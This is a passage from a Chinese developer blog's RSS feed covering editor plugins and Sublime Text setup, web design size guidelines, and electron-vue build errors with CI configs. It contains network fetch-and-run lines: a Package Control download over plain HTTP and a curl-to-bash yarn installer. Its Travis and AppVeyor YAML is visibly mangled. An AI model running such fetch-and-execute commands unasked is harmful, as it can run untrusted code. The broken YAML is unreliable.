<p>最快速的安装 <code>Bracket</code> s 扩展的方法是使用扩展管理器（ <code>Extension Manager</code> ）– 直接在 <code>Brackets</code> 的工具栏选择 <code>File &gt; Extension Manager</code> 即可。</p>
<h3 id="修改界面语言" tabindex="-1"> 修改界面语言</h3>
<p>改成中文。 Debug-&gt;Switch Language</p>
<h3 id="插件推荐-1" tabindex="-1"> 插件推荐</h3>
<ul>
<li><strong>Emmet</strong> =&gt; 前端开发者必备</li>
<li><strong>Autoprefixer</strong> =&gt; <code>CSS3</code> 私有前缀自动补全插件</li>
<li><strong>CSScomb</strong> =&gt; <code>CSS</code> 属性自动排序</li>
<li><strong>Brackets Icons</strong> =&gt; 为你的 <code>Brackets</code> 边栏添加文件图标</li>
<li><strong>Brackets CSS Class Code hint</strong> =&gt; 输入 <code>class</code> 或 <code>id</code> 时会出现 <code>css</code> 里面的 <code>class／id</code></li>
<li><strong>JS CSS Minifier</strong> =&gt; 压缩 <code>JS</code> 和 <code>CSS</code> 文件</li>
<li><strong>Beautify</strong> =&gt; 这个扩展可以让你的 <code>HTML</code> 、 <code>CSS</code> 、 <code>JavaScript</code> 等代码格式化一致, 从而提升可读性</li>
<li><strong>Simple To-Do</strong> =&gt; 使用 <code>Simple To-Do</code> 可以确保你不会忘记项目的任务。它允许你在 <code>Brackets</code> 中为每一个项目创建 <code>TODO</code> 列表。</li>
<li><strong>Markdown Preview</strong> =&gt; <code>Markdown</code> 文件实时预览</li>
<li><strong>Markdown Toolbar</strong> =&gt; <code>Markdown</code> 文件的快捷工具栏</li>
<li><strong>JavaScript Globals</strong> =&gt; <code>javascript</code> 全局变量高亮</li>
<li><strong>Brackets Vue</strong> =&gt; <code>Vue</code> 文件语法高亮</li>
</ul>
<h2 id="sublime-text-3" tabindex="-1"> Sublime Text 3</h2>
<p>非开源。功能强大, 可以编译 <code>C</code> 、 <code>Java</code> 、 <code>Python</code> 等编程语言。 <code>Liunx</code> 下启动可以在终端输入 <code>subl</code> 。部分插件依赖于 <code>Node.js</code> 。</p>
<h3 id="下载地址-2" tabindex="-1"> 下载地址</h3>
<p>官网下载地址: <a href="http://www.sublimetext.com/3" target="_blank" rel="noopener noreferrer">Sublime Text 3</a><br> 官网下载地址下不下来点击以下链接下载: <a href="http://oss-blog.test.upcdn.net/Sublime%20Text%20Build%203126%20Setup.exe?attname=" target="_blank" rel="noopener noreferrer">Sublime Text Build 3126 Setup.exe</a><br> <a href="http://oss-blog.test.upcdn.net/Sublime%20Text%20Build%203126%20x64%20Setup.exe?attname=" target="_blank" rel="noopener noreferrer">Sublime Text Build 3126 x64 Setup.exe</a></p>
<h3 id="安装插件-2" tabindex="-1"> 安装插件</h3>
<h3 id="直接安装" tabindex="-1"> 直接安装:</h3>
<p>安装 Sublime text 3 插件很方便, 可以直接下载安装包解压缩到 Packages 目录（菜单-&gt;preferences-&gt;packages）</p>
<h3 id="使用-package-control-安装" tabindex="-1"> 使用 Package Control 安装</h3>
<p>按 <code>Ctrl+</code> 调出 <code>console</code> 粘贴以下代码到底部命令行并回车:</p>
<div><pre><code><span>import</span> urllib<span>.</span>request<span>,</span> os<span>;</span>
pf <span>=</span> <span>'Package Control.sublime-package'</span><span>;</span>
ipp <span>=</span> sublime<span>.</span><span>installed_packages_path</span><span>(</span><span>)</span><span>;</span>
urllib<span>.</span>request<span>.</span><span>install_opener</span><span>(</span>urllib<span>.</span>request<span>.</span><span>build_opener</span><span>(</span>urllib<span>.</span>request<span>.</span><span>ProxyHandler</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
<span>open</span><span>(</span>os<span>.</span>path<span>.</span><span>join</span><span>(</span>ipp<span>,</span> pf<span>)</span><span>,</span> <span>'wb'</span><span>)</span><span>.</span><span>write</span><span>(</span>urllib<span>.</span>request<span>.</span><span>urlopen</span><span>(</span><span>'http://sublime.wbond.net/'</span> <span>+</span> pf<span>.</span><span>replace</span><span>(</span><span>' '</span><span>,</span> <span>'%20'</span><span>)</span><span>)</span><span>.</span><span>read</span><span>(</span><span>)</span><span>)</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>重启 <code>Sublime Text 3</code> 。 如果在 <code>Perferences</code> -&gt; <code>package settings</code> 中看到 <code>package control</code> 这一项, 则安装成功。 顺便贴下 Sublime Text2 的代码。</p>
<div><pre><code><span>import</span> urllib2<span>,</span> os<span>;</span>
pf <span>=</span> <span>'Package Control.sublime-package'</span><span>;</span>
ipp <span>=</span> sublime<span>.</span><span>installed_packages_path</span><span>(</span><span>)</span><span>;</span>
os<span>.</span><span>makedirs</span><span>(</span>ipp<span>)</span> <span>if</span> not os<span>.</span>path<span>.</span><span>exists</span><span>(</span>ipp<span>)</span>
<span>else</span> None<span>;</span>
urllib2<span>.</span><span>install_opener</span><span>(</span>urllib2<span>.</span><span>build_opener</span><span>(</span>urllib2<span>.</span><span>ProxyHandler</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
<span>open</span><span>(</span>os<span>.</span>path<span>.</span><span>join</span><span>(</span>ipp<span>,</span> pf<span>)</span><span>,</span> <span>'wb'</span><span>)</span><span>.</span><span>write</span><span>(</span>urllib2<span>.</span><span>urlopen</span><span>(</span><span>'http://sublime.wbond.net/'</span> <span>+</span> pf<span>.</span><span>replace</span><span>(</span><span>' '</span><span>,</span> <span>'%20'</span><span>)</span><span>)</span><span>.</span><span>read</span><span>(</span><span>)</span><span>)</span><span>;</span>
<span>print</span><span>(</span><span>'Please restart Sublime Text to finish installation'</span><span>)</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="用组件安装插件的方法" tabindex="-1"> 用组件安装插件的方法:</h3>
<ol>
<li>按下 <code>Ctrl+Shift+P</code> 调出命令面板</li>
<li>输入 <code>install</code> 调出 Install Package 选项并回车, 然后在列表中选中要安装的插件。</li>
</ol>
<h3 id="注意" tabindex="-1"> 注意</h3>
<p>国内使用 <code>Sublime Text 3</code> , 经常可能遇到无法安装可用插件问题, 可 <code>remove</code> 掉 <code>Package Control</code> 重新安装下；如遇到连 <code>Package Control</code> 也无法安装, 则可以在别处拷贝一份关于 <code>Package Control</code> 的文件( <code>Package Control.sublime-package</code> )存放于 <code>Installed Packages</code> 目录之下即可</p>
<h3 id="插件推荐-2" tabindex="-1"> 插件推荐</h3>
<ul>
<li><strong>Emmet</strong> =&gt; 前端开发者必备</li>
<li><strong>Autoprefixer</strong> =&gt; <code>CSS3</code> 私有前缀自动补全插件</li>
<li><strong>CSScomb</strong> =&gt; <code>CSS</code> 属性自动排序</li>
<li><strong>JsFormat</strong> =&gt; 一个 <code>JS</code> 代码格式化插件</li>
<li><strong>Tag</strong> =&gt; 格式化 <code>Html/Xml</code> 代码</li>
<li><strong>phpFormat</strong> =&gt; 格式化 <code>php</code> 代码</li>
<li><strong>HTML-CSS-JS Prettify</strong> =&gt; 一款集成了格式化（美化）html、css、js 三种文件类型的插件, 依赖于 <code>Node.js</code></li>
<li><strong>Minify</strong> =&gt; 自动压缩 <code>JS</code> 、 <code>CSS</code> 文件</li>
<li><strong>ColorPicker</strong> =&gt; 颜色选择器</li>
<li><strong>BracketHighlighter</strong> =&gt; 类似于代码匹配, 可以匹配括号, 引号等符号内的范围</li>
<li><strong>SublimeCodeIntel</strong> =&gt; 代码自动提示</li>
<li><strong>SublimeLinter</strong> =&gt; 用于高亮提示用户编写的代码中存在的不规范和错误的写法</li>
<li><strong>DocBlockr</strong> =&gt; 可以自动生成 <code>PHPDoc</code> 风格的注释</li>
<li><strong>ChineseLocalizations</strong> =&gt; 汉化 <code>Sublime Text</code></li>
<li><strong>MarkDownEditing</strong> =&gt; <code>markdown</code> 文件语法高亮</li>
<li><strong>vue Syntax Highlight</strong> =&gt; <code>vue</code> 文件语法高亮</li>
</ul>
<h2 id="visual-studio-code" tabindex="-1"> Visual Studio Code</h2>
<p>微软开发的一款编辑器, 免费而且跨平台, 可以编写 <code>C</code> 、 <code>Java</code> 、 <code>Python</code> 等代码, 在界面上与 Sublime Text 非常相似</p>
<h3 id="下载地址-3" tabindex="-1"> 下载地址</h3>
<p>官网下载地址: <a href="http://code.visualstudio.com/Download" target="_blank" rel="noopener noreferrer">VS code</a></p>
<h3 id="安装插件-3" tabindex="-1"> 安装插件</h3>
<p>使用 <code>Ctrl + Shift + X</code> 调出安装插件界面</p>
<h3 id="插件推荐-3" tabindex="-1"> 插件推荐</h3>
<ul>
<li><strong>HTML Snippets</strong> =&gt; 超级实用且初级的 <code>H5</code> 代码片段以及提示</li>
<li><strong>HTML CSS Support</strong> =&gt; 让 <code>html</code> 标签上写 class 智能提示当前项目所支持的样式</li>
<li><strong>Debugger for Chrome</strong> =&gt; 让 vscode 映射 chrome 的 debug 功能, 静态页面都可以用 vscode 来打断点调试</li>
<li><strong>vscode-icons</strong> =&gt; 让 vscode 资源树目录加上图标</li>
<li><strong>Path Intellisense</strong> =&gt; 自动路劲补全, 默认不带这个功能的</li>
<li><strong>Document this</strong> =&gt; js 的注释模板</li>
<li><strong>ESlint</strong> =&gt; 代码规范性检查</li>
<li><strong>vetur</strong> =&gt; <code>vue</code> 语法高亮</li>
<li><strong>Git Easy</strong> =&gt; <code>git</code> 管理</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>网页设计规范-网页设计稿尺寸</title>
      <link>https://vxhly.github.io/views/design/web-design-specification.html</link>
      <guid>https://vxhly.github.io/views/design/web-design-specification.html</guid>
      <source url="https://vxhly.github.io/rss.xml">网页设计规范-网页设计稿尺寸</source>
      <description>前言
最近为了适配多平台、多分辨率甚是烦恼, 先不说代码写的对不对, 是不是完美的, 这次就先从源头(UI 设计稿)抓一抓吧, 这里举例的是某宝的设计团队多年的经验, 作为借鉴引用给前端工作人员以及 UI 设计师们。

</description>
      <category>design</category>
      <pubDate>Thu, 08 Aug 2019 10:07:37 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>最近为了适配多平台、多分辨率甚是烦恼, 先不说代码写的对不对, 是不是完美的, 这次就先从源头(UI 设计稿)抓一抓吧, 这里举例的是某宝的设计团队多年的经验, 作为借鉴引用给前端工作人员以及 UI 设计师们。</p>
</div>

<h2 id="痛点" tabindex="-1"> 痛点</h2>
<p>虽然 H5 的页面与 PC 的 Web 页面相比简单了不少, 但让我们头痛的事情是要想尽办法让页面能适配众多不同的终端设备。看看下图你就会知道, 这是多么痛苦的一件事情:</p>
<p><img src="/assets/web-design-1.png" alt="web-design-1"></p>
<h2 id="手淘团队适配协作模式" tabindex="-1"> 手淘团队适配协作模式</h2>
<p>早期移动端开发, 对于终端设备适配问题只属于 Android 系列, 只不过很多设计师常常忽略 Android 适配问题, 只出一套 iOS 平台设计稿。但随着 iPhone6, iPhone6+的出现, 从此终端适配问题不再是 Android 系列了, 也从这个时候让移动端适配全面进入到“杂屏”时代。</p>
<p><img src="/assets/web-design-2.png" alt="web-design-2"></p>
<p>上图来自于 <a href="http://www.paintcodeapp.com/news/ultimate-guide-to-iphone-resolutions" target="_blank" rel="noopener noreferrer">paintcodeapp.com</a></p>
<p>为了应对这多么的终端设备, 设计师和前端开发之间又应该采用什么协作模式? 或许大家对此也非常感兴趣。</p>
<p>而整个手淘设计师和前端开发的适配协作基本思路是:</p>
<ul>
<li>选择一种尺寸作为设计和开发基准</li>
<li>定义一套适配规则, 自动适配剩下的两种尺寸(其实不仅这两种, 你懂的)</li>
<li>特殊适配效果给出设计效果</li>
</ul>
<p>还是上一张图吧, 因为一图胜过千言万语:</p>
<p><img src="/assets/web-design-3.jpg" alt="web-design-3"></p>
<p>在此也不做更多的阐述。在手淘的设计师和前端开发协作过程中: 手淘设计师常选择 iPhone6 作为基准设计尺寸, 交付给前端的设计尺寸是按 750px * 1334px 为准(高度会随着内容多少而改变)。前端开发人员通过一套适配规则自动适配到其他的尺寸。著作权归作者所有。</p>
<h2 id="移动端-h5-设计稿尺寸" tabindex="-1"> 移动端 H5 设计稿尺寸</h2>
<p>移动端 H5 尺寸 设计移动端 H5 项目的时候, 我们一般以用户量较高的 iPhone6/7/8 的尺寸: 750x1334px 为准, 然后我们要在顶部预留出微信或者浏览器导航区域。主要内容区域就可以自由设计了。一般 H5 的操作是上下滑动。字体方面使用苹方字体, 并且字号设置为 24PX 以上, 渲染方式设置成锐利。英文则需要使用 SF-UI 代替。当然 H5 可以调用背景音乐、视频、链接等多媒体, 让体验更佳。除了让前端小哥哥们开发之外, 其实还有一种方式可以无需代码生成简易版的 H5, 就是通过 H5 工具生成。目前比较火的 H5 生成工具有: MAKA、iH5、兔展等, 如果我们要自己生成而不是通过前端开发, 那么我们设计稿的尺寸需要设置为 640x1008PX。这些工具较为简单, 注册后将 PSD 上传即可对每个原件进行动效的设置了。但是如果需要复杂的动效和交互, 还是需要前端工程师的配合。</p>
<h2 id="电脑-web-页-banner-设计稿尺寸" tabindex="-1"> 电脑 Web 页 Banner 设计稿尺寸</h2>
<p>Banner 的宽度有两种, 一种是满屏（1920PX）、一种是基于安全距离的满尺寸（1200px 或 1000px）。高度要注意了: 一般以 1920x1080px 为基准的用户屏幕, 加上浏览器本身与插件和底部工具条等距离, 留给网站的一屏高度大概为 900px, 所以 banner 不可以做得很高, 否则第一屏信息会显示得不够。你可能会说, 那就让用户往下拉啊。但是在网站的访问用户之中, 第二屏触及到的用户比第一屏会少很多。也就是很多用户可能点击网站后就会跳走或者关闭, 那么第一屏的信息真的非常重要了, 可谓是寸土寸金。所以我们的 banner 不应该占据过大的区域。比如站酷网的 Banner 区域为 1380x350px。</p>
<h2 id="画板尺寸" tabindex="-1"> 画板尺寸</h2>
<p>因为网页尺寸与用户屏幕相关, 而用户屏幕的种类难以统计。所以我们的设计稿只能主要顾及主流用户的分辨率, 其他分辨率用适配的方式来解决。在最新版 Photoshop 网站 Web 预设尺寸给了我们一些启示: 常见尺寸（1366x768px）、大网页（1920x1080px）、最小尺寸（1024x768px）、Macbook Pro13 （2560x1600px）、MacBook Pro15（2880x1800px）、iMac 27（2560x1440px）等。这些是主流尺寸, 而我们如果做网站时建议按主流的分辨率 1920x1080px 来设计。所以我们通常设计网站时的网站宽度为 1920px, 每个屏幕的高度约为 900px。为什么是 900px 呢? 因为 1080 还要减去浏览器头部和底部高度, 大约就是 900px 了。内容安全区域为 1200px （或 1000px / 1400px）。以这个尺寸来设计相对标准。当然在设计网页前需要知会前端设计尺寸, 因为对于适配的方式和后续配合他们更有发言权。</p>
<h2 id="web-字体要求" tabindex="-1"> web 字体要求</h2>
<p>在网站设计中我们的文字大小一般来说是 12-20 像素。为什么不能比 12px 更小? 因为如果比 12 像素更小的中文无法放得下复杂的笔画了。而且奇数的文字表现和适配都不好做, 也就是说我们必须使用偶数的字号来设计。如: 文字使用宋体、大小为 12px、渲染方式选择无。稍大一些的字体使用微软雅黑、大小为 14-20px、渲染方式选择 Windows Lcd 或锐利。另外, 英文和数字需使用 Arial 字体, 渲染方式选择无。</p>
<h2 id="文字排版八条定律" tabindex="-1"> 文字排版八条定律</h2>
<ul>
<li>第一, 保证文字是可读的。</li>
<li>第二, 不要在一个版面中使用三种以上的字体。</li>
<li>第三, 如果英文标题或单独进行排版时, 尽量全部使用大写而非首字母大写。中文标题或单独进行排版时结尾不需要句号。</li>
<li>第四, 文字之间的间距在 UI 设计中一般设置为 0, 行距一般为字号本身的 1.5 倍到 2 倍。但是考虑到用户使用场景, 比如用户在地- 铁内阅读新闻时可能地铁会出现晃的情况而导致串行, 就需要我们考虑增加行距。总之字间距和行距以及文字大小都要依据实际场景来决定。在 UI 设计中文字大小单位须设置成 PX（像素）, 大小必须是偶数。如: 24px、26px、28px 等。</li>
<li>第五, 文字阅读需要清晰地背景区分, 比如黑纸白字和白纸黑字原则。</li>
<li>第六, 除非不得已尽量避免在一个版式中使用中英文混排。</li>
<li>第七, 文本左边对齐同时右边也需要对齐。可以通过 PS 中的段落面板设置间距组合和避头尾法则, 但是有时半角符号可能会让我们很棘手, 那就要通过调整间距和空格等方式让文本尽量对齐。</li>
<li>第八, 中文前面需要空两个全角字符空格, 英文前面无需空格, 但需要大写。</li>
</ul>
<h2 id="总结" tabindex="-1"> 总结</h2>
<p>无论您面对的项目是 To C 的还是 To B 的网站产品, 我们都应该首先 <code>确立设计风格</code> &gt; <code>寻找设计素材</code> &gt; <code>建立情绪板</code> &gt; <code>完成视觉稿</code> &gt; <code>切图标注</code> &gt; <code>建立视觉规范</code> &gt; <code>进行项目走查</code> 如果设计一般网站的页面, 可以按照 1920 X 1080px 尺寸设计。每屏高度 900px, 字体使用宋体 12px、无和微软雅黑 14-20、Windows LCD。Banner 尽量满屏, 但是图片需要按照 4:3 或 16:9 等比例来设计。做网站时可以建立栅格以更好地进行自适应和响应式布局, 我们也要为超链接和按钮设计不同的相应鼠标的状态；另外我们也可以多多尝试在网站设计中加入视差滚动、雪碧图动画等好玩的交互。</p>
<p>如果设计手机端的页面, 可以按照 750X1334PX 尺寸设计。字体使用苹方 24PX 以上、锐利。英文字体使用 SF UI。按钮和点击区域需要大于 88PX 方便手指点击。并且头部需要预留出微信或浏览器的导航区域。</p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/web-design-1.png" type="image/png"/>
    </item>
    <item>
      <title>初学 electron-vue</title>
      <link>https://vxhly.github.io/views/electron/learn-electron-vue.html</link>
      <guid>https://vxhly.github.io/views/electron/learn-electron-vue.html</guid>
      <source url="https://vxhly.github.io/rss.xml">初学 electron-vue</source>
      <description>前言
记录学习 electron-vue 时遇到的一些坑, 从报错或者日常需求上出发找寻解决方案。

</description>
      <category>electron</category>
      <pubDate>Tue, 05 Nov 2019 15:29:47 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>记录学习 electron-vue 时遇到的一些坑, 从报错或者日常需求上出发找寻解决方案。</p>
</div>

<h2 id="坑一" tabindex="-1"> 坑一</h2>
<p>一般的高版本的 node, 大于 12 的版本时候。初步运行 electron-vue 项目时候会报错！</p>
<div><p>报错特征</p>
<p>ERROR in Template execution failed: ReferenceError: process is not defined</p>
<p>ERROR in ReferenceError: process is not defined</p>
<ul>
<li>
<p>index.ejs:102</p>
<p>/Users/codeman/github/my-project/src/index.ejs:102:2</p>
</li>
<li>
<p>index.ejs:107 module.exports</p>
<p>/Users/codeman/github/my-project/src/index.ejs:107:3</p>
</li>
<li>
<p>index.js:284</p>
<p>[my-project]/[html-webpack-plugin]/index.js:284:18</p>
</li>
</ul>
</div>
<h3 id="解决方案" tabindex="-1"> 解决方案</h3>
<p>修改 <code>.electron-vue/webpack.renderer.config.js</code> 和 <code>.electron-vue/webpack.web.config.js</code> 如下：</p>
<p><code>.electron-vue/webpack.renderer.config.js</code></p>
<div><pre><code><span>new</span> <span>HtmlWebpackPlugin</span><span>(</span><span>{</span>
  <span>filename</span><span>:</span> <span>"index.html"</span><span>,</span>
  <span>template</span><span>:</span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>"../src/index.ejs"</span><span>)</span><span>,</span>
  <span>minify</span><span>:</span> <span>{</span>
    <span>collapseWhitespace</span><span>:</span> <span>true</span><span>,</span>
    <span>removeAttributeQuotes</span><span>:</span> <span>true</span><span>,</span>
    <span>removeComments</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>templateParameters</span><span>(</span><span>compilation<span>,</span> assets<span>,</span> options</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>compilation</span><span>:</span> compilation<span>,</span>
      <span>webpack</span><span>:</span> compilation<span>.</span><span>getStats</span><span>(</span><span>)</span><span>.</span><span>toJson</span><span>(</span><span>)</span><span>,</span>
      <span>webpackConfig</span><span>:</span> compilation<span>.</span>options<span>,</span>
      <span>htmlWebpackPlugin</span><span>:</span> <span>{</span>
        <span>files</span><span>:</span> assets<span>,</span>
        <span>options</span><span>:</span> options<span>,</span>
      <span>}</span><span>,</span>
      process<span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
  <span>nodeModules</span><span>:</span>
    process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>!==</span> <span>"production"</span>
      <span>?</span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>"../node_modules"</span><span>)</span>
      <span>:</span> <span>false</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>.electron-vue/webpack.web.config.js</code></p>
<div><pre><code><span>new</span> <span>HtmlWebpackPlugin</span><span>(</span><span>{</span>
  <span>filename</span><span>:</span> <span>"index.html"</span><span>,</span>
  <span>template</span><span>:</span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>"../src/index.ejs"</span><span>)</span><span>,</span>
  <span>templateParameters</span><span>(</span><span>compilation<span>,</span> assets<span>,</span> options</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>compilation</span><span>:</span> compilation<span>,</span>
      <span>webpack</span><span>:</span> compilation<span>.</span><span>getStats</span><span>(</span><span>)</span><span>.</span><span>toJson</span><span>(</span><span>)</span><span>,</span>
      <span>webpackConfig</span><span>:</span> compilation<span>.</span>options<span>,</span>
      <span>htmlWebpackPlugin</span><span>:</span> <span>{</span>
        <span>files</span><span>:</span> assets<span>,</span>
        <span>options</span><span>:</span> options<span>,</span>
      <span>}</span><span>,</span>
      process<span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
  <span>minify</span><span>:</span> <span>{</span>
    <span>collapseWhitespace</span><span>:</span> <span>true</span><span>,</span>
    <span>removeAttributeQuotes</span><span>:</span> <span>true</span><span>,</span>
    <span>removeComments</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>nodeModules</span><span>:</span> <span>false</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="坑二" tabindex="-1"> 坑二</h2>
<p>在初步使用 <code>electron-builder</code> 编译 electron-vue 项目时候会报错（PS：一般出现在 MacOS 下）</p>
<div><p>报错特征</p>
<p>Error: Exit code: 2. Command failed: /usr/bin/perl /private/var/folders/mj/n34f_bp95zq2_1fwll3bq70m0000gn/T/t-51hskU/1-dmgProperties.pl Can't locate Mac/Memory.pm in @INC (you may need to install the Mac:: Memory module) (@INC contains: /Library/Perl/5.18/darwin-thread-multi-2level /Library/Perl/5.18 /Network/Library/Perl/5.18/darwin-thread-multi-2level /Network/Library/Perl/5.18 /Library/Perl/Updates/5.18.4 /System/Library/Perl/5.18/darwin-thread-multi-2level /System/Library/Perl/5.18 /System/Library/Perl/Extras/5.18/darwin-thread-multi-2level /System/Library/Perl/Extras/5.18 .) at /private/var/folders/mj/n34f_bp95zq2_1fwll3bq70m0000gn/T/t-51hskU/1-dmgProperties.pl line 4. BEGIN failed--compilation aborted at /private/var/folders/mj/n34f_bp95zq2_1fwll3bq70m0000gn/T/t-51hskU/1-dmgProperties.pl line 4.</p>
</div>
<h3 id="解决方案-1" tabindex="-1"> 解决方案</h3>
<p>升级你的 <code>electron-builder</code> 依赖包</p>
<div><pre><code><span>npm</span> <span>install</span> electron-builder@latest -D
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="坑三" tabindex="-1"> 坑三</h2>
<p>默认项目配置的 sass/scss 编译器为 <code>node-sass</code> , 该编译器在 Windows 环境下及其的不友好, 所以这里比较推荐的是使用 <code>Dart Sass</code> , 有兴趣的小伙伴传送门在这里 <a href="/views/manual/usage-of-docker.html#%E6%8B%93%E5%B1%95-2">为啥要用 Dart sass</a></p>
<h3 id="解决方案-2" tabindex="-1"> 解决方案</h3>
<p>删除你的原有的 <code>node-sass</code> 依赖项, <code>node-sass</code> 和 <code>Dart Sass</code> 几乎无缝转换, 所以不用担心兼容问题</p>
<div><pre><code><span>npm</span> <span>install</span> sass -D
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="坑四" tabindex="-1"> 坑四</h2>
<p>CI 自动编译时会报 <code>Node.js</code> 的版本过低, 导致编译错误, <code>Travis CI</code> 平台上的日志特征</p>
<div><p>报错特征</p>
<p>$ yarn yarn install v1.19.2 warning You are using Node &quot;7.10.1&quot; which is not supported and may encounter bugs or unexpected behavior. Yarn supports the following semver range: &quot;^4.8.0 || ^5.7.0 || ^6.2.2 || &gt;=8.0.0&quot; warning package.json: No license field warning demo@0.0.1: No license field [1/4] Resolving packages... [2/4] Fetching packages... error getmac@4.3.0: The engine &quot;node&quot; is incompatible with this module. Expected version &quot;&gt;=8&quot;. Got &quot;7.10.1&quot; error Found incompatible module. info Visit https://yarnpkg.com/en/docs/cli/install for documentation about this command. The command &quot;yarn&quot; failed and exited with 1 during . Your build has been stopped.</p>
</div>
<h3 id="解决方案-3" tabindex="-1"> 解决方案</h3>
<p>建议在 <code>.travis.yml</code> 和 <code>appveyor.yml</code> 中修改 <code>Node.js</code> 的版本</p>
<p><code>.travis.yml</code></p>
<div><pre><code><span>osx_image</span><span>:</span> xcode8.3
<span>sudo</span><span>:</span> required
<span>dist</span><span>:</span> trusty
<span>language</span><span>:</span> c
<span>matrix</span><span>:</span>
  <span>include</span><span>:</span>

  <span>+ os</span><span>:</span> osx

  <span># - os: linux</span>
    <span>env</span><span>:</span> CC=clang CXX=clang++ npm_config_clang=1
    <span>compiler</span><span>:</span> clang
<span>cache</span><span>:</span>
  <span>directories</span><span>:</span>

  + node_modules
  + "$HOME/.electron"
  + "$HOME/.cache"

<span>addons</span><span>:</span>
  <span>apt</span><span>:</span>
    <span>packages</span><span>:</span>

    <span>-</span> libgnome<span>-</span>keyring<span>-</span>dev
    <span>-</span> icnsutils

<span>before_install</span><span>:</span>

* mkdir <span>-</span>p /tmp/git<span>-</span>lfs <span>&amp;&amp;</span> curl <span>-</span>L https<span>:</span>//github.com/github/git<span>-</span>lfs/releases/download/v1.2.1/git<span>-</span>lfs<span>-</span>$(<span>[</span>

  "$TRAVIS_OS_NAME" == "linux" <span>]</span> <span>&amp;&amp;</span> echo "linux" <span>|</span><span>|</span> echo "darwin")<span>-</span>amd64<span>-</span>1.2.1.tar.gz
  <span>|</span> tar <span>-</span>xz <span>-</span>C /tmp/git<span>-</span>lfs <span>-</span><span>-</span>strip<span>-</span>components 1 <span>&amp;&amp;</span> /tmp/git<span>-</span>lfs/git<span>-</span>lfs pull

* if <span>[</span><span>[</span> "$TRAVIS_OS_NAME" == "linux" <span>]</span><span>]</span>; then sudo apt<span>-</span>get install <span>-</span><span>-</span>no<span>-</span>install<span>-</span>recommends <span>-</span>y icnsutils graphicsmagick xz<span>-</span>utils; fi

<span>install</span><span>:</span>

* nvm install 12
* curl <span>-</span>o<span>-</span> <span>-</span>L https<span>:</span>//yarnpkg.com/install.sh <span>|</span> bash
* source ~/.bashrc
* npm install <span>-</span>g xvfb<span>-</span>maybe
* yarn install

<span>script</span><span>:</span>

* yarn run release

<span>branches</span><span>:</span>
  <span>only</span><span>:</span>

  + master

</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>appveyor.yml</code></p>
<div><pre><code><span>version</span><span>:</span> 0.1.<span>{</span>build<span>}</span>

<span>branches</span><span>:</span>
  <span>only</span><span>:</span>

    <span>-</span> master

<span>image</span><span>:</span> Visual Studio 2017
<span>platform</span><span>:</span>

  + x64

<span>cache</span><span>:</span>

  + node_modules
  + '%APPDATA%\npm<span>-</span>cache'
  + '%USERPROFILE%\.electron'
  + '%USERPROFILE%\AppData\Local\Yarn\cache'

<span>init</span><span>:</span>

  + git config <span>-</span><span>-</span>global core.autocrlf input

<span>install</span><span>:</span>

  <span>+ ps</span><span>:</span> Install<span>-</span>Product node 12 x64
  + git reset <span>-</span><span>-</span>hard HEAD
  + yarn install
  + node <span>-</span><span>-</span>version

<span>build_script</span><span>:</span>

  + yarn run release

<span>test</span><span>:</span> off

</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="坑五" tabindex="-1"> 坑五</h2>
<p>CI 自动编译成功但是并未成功发布到 GitHub 上, <code>Appveyor CI</code> 平台上的日志特征</p>
<div><p>报错特征</p>
